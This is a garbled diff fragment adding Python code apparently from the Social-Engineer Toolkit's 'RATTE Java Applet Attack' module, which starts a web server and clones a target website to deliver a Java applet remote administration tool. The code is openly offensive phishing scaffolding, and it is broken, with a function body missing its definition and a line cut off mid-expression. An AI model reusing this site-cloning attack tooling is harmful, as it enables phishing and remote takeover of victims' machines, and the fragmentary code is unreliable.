@@ -1,0 +1,23 @@
+
+definepath = os.getcwd()
+setdir = setdir()
+MAIN=" RATTE Java Applet Attack (Remote Administration Tool Tommy Edition) - Read the readme/RATTE_README.txt first"
+AUTHOR="   Thomas Werth"
+httpd=None
+	global httpd
+	try:
+		class ReusableTCPServer(SocketServer.TCPServer): allow_reuse_address=True
+		httpd = ReusableTCPServer(("0.0.0.0", port),SimpleHTTPServer.SimpleHTTPRequestHandler)
+		thread.start_new_thread(httpd.serve_forever,())
+		os.chdir(directory)
+	except KeyboardInterrupt:
+		core.print_info("Exiting the SET web server...")
+		httpd.socket.close()
+def stop_web_server_tw():
+	global httpd
+	try:
+		httpd.socket.close()
+	except Exception:
+		httpd.socket.close()
+	core.site_cloner(website,directory,"java")
+	if os.path.isfile("%s/rand_gen" % (setd
